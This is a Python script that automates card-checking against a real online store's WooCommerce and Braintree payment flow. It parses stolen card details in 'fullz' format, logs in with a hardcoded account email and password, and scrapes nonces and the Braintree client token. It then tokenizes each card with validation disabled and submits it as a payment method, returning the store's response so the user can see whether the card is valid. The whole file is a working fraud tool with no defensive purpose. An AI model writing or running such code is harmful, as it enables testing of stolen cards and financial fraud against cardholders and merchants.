import re
import json
import base64
import random
import asyncio
import httpx
from bs4 import BeautifulSoup
from FUNC.defs import *
import time



def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

async def create_braintree_auth(fullz, session):
    try:
        cc, mes, ano, cvv = fullz.split("|")
        user = "cristniki" + str(random.randint(9999, 574545))
        mail = "cristniki" + str(random.randint(9999, 574545)) + "@gmail.com"
        
        headers = {
            'authority': 'unpluggedperformance.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'if-modified-since': 'Sat, 08 Feb 2025 17:22:44 GMT',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }

        response = await session.get('https://unpluggedperformance.com/my-account/', headers=headers)
        log = gets(response.text, 'input type="hidden" id="woocommerce-login-nonce" name="woocommerce-login-nonce" value="', '" />')

        if not log:
            print("Failed to extract login nonce")
            return

        headers = {
            'authority': 'unpluggedperformance.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://unpluggedperformance.com',
            'referer': 'https://unpluggedperformance.com/my-account/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }

        data = {
            'username': 'anonymoussurojit@gmail.com',
            'password': 'DDcc55@&',
            'woocommerce-login-nonce': log,
            '_wp_http_referer': '/my-account/',
            'login': 'Log in',
        }

        response = await session.post('https://unpluggedperformance.com/my-account/', headers=headers, data=data)

        headers = {
            'authority': 'unpluggedperformance.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'referer': 'https://unpluggedperformance.com/my-account/add-payment-method/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }

        response = await session.get('https://unpluggedperformance.com/my-account/add-payment-method/', headers=headers)
        client_token = re.search(r'var wc_braintree_client_token = \[(".*?")\]', response.text)
        pay = re.search(r'input type="hidden" id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="([^"]+)"', response.text)

        if client_token and pay:
            token = client_token.group(1)
            nonce = pay.group(1)

            decoded_token = base64.b64decode(token).decode('utf-8')
            token_json = json.loads(decoded_token)
            autho = token_json.get('authorizationFingerprint')
        else:
            print("Failed to extract client token or add payment nonce")
            return

        headers = {
            'authority': 'payments.braintree-api.com',
            'accept': '*/*',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'authorization': f'Bearer {autho}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://my.restrictcontentpro.com',
            'referer': 'https://my.restrictcontentpro.com/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': 'f2cea622-0c78-492c-ae6e-634fa48eb463',
            },
            'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment     }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
            'operationName': 'ClientConfiguration',
        }

        response = await session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
        baby = response.text
        response_data = json.loads(baby)

        google_authorization = response_data["data"]["clientConfiguration"]["googlePay"]["googleAuthorization"]
        merchant_id = response_data["data"]["clientConfiguration"]["merchantId"]
        client_id = response_data["data"]["clientConfiguration"]["paypal"]["clientId"]
        braintree_client_id = response_data["data"]["clientConfiguration"]["paypal"]["braintreeClientId"]
        access_token = response_data["data"]["clientConfiguration"]["venmo"]["accessToken"]
        paypal_client_id = response_data["data"]["clientConfiguration"]["googlePay"]["paypalClientId"]

        headers = {
            'Accept': '*/*',
            'Authorization': f'Bearer {autho}',
            'Braintree-Version': '2018-05-10',
            'Content-Type': 'application/json',
            'Origin': 'https://assets.braintreegateway.com',
            'Referer': 'https://assets.braintreegateway.com',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': '7434070c-bb48-4f87-9f21-48364df5a79f',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mes,
                        'expirationYear': ano,
                        'cvv': cvv,
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        response = await session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

        if response.status_code == 200:
            data = response.json()
            token = data["data"]["tokenizeCreditCard"]["token"]
            ext = data["extensions"]["requestId"]
        else:
            print("Failed to retrieve token")
            return

        headers = {
            'authority': 'unpluggedperformance.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://unpluggedperformance.com',
            'referer': 'https://unpluggedperformance.com/my-account/add-payment-method/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }

        data = {
            'payment_method': 'braintree_cc',
            'braintree_cc_nonce_key': token,
            'braintree_cc_device_data': '{"device_session_id":"f55c32bbec2cfe0795c658cfdf6d644b","fraud_merchant_id":null,"correlation_id":"aa2f2841-5f4f-4889-97ea-f73d02a1"}',
            'braintree_cc_3ds_nonce_key': '',
            'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/cxnsk9jb5vdzfvpf/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/cxnsk9jb5vdzfvpf"},"merchantId":"merchant_id","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"cxnsk9jb5vdzfvpf","supportedNetworks":["visa","mastercard","amex","discover"]},"fastlane":{"enabled":true},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","American Express","Visa","Discover","JCB","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"Unplugged Performance","enabled":true,"environment":"production","googleAuthorizationFingerprint":"google_authorization","paypalClientId":"paypal_client_id","supportedNetworks":["visa","mastercard","amex","discover"]},"payWithVenmo":{"merchantId":"3125640180359234056","accessToken":"access_token","environment":"production","enrichedCustomerDataEnabled":false},"paypalEnabled":true,"paypal":{"displayName":"Unplugged Performance","clientId":"client_id","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"braintree_client_id","billingAgreementsEnabled":true,"merchantAccountId":"UnpluggedPerformance_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
            'billing_address_1': '7 North Street',
            'woocommerce-add-payment-method-nonce': nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }

        time.sleep(19)

        response = await session.post(
            'https://unpluggedperformance.com/my-account/add-payment-method/',
            headers=headers,
            data=data,
        )

        soup = BeautifulSoup(response.text, 'html.parser')
        notice_banner = soup.find('div', class_='wc-block-components-notice-banner__content')

        if notice_banner:
            output_text = notice_banner.get_text(strip=True)
        else:
            output_text = "No notice banner found\n"

        return output_text

    except Exception as e:
        return str(e)

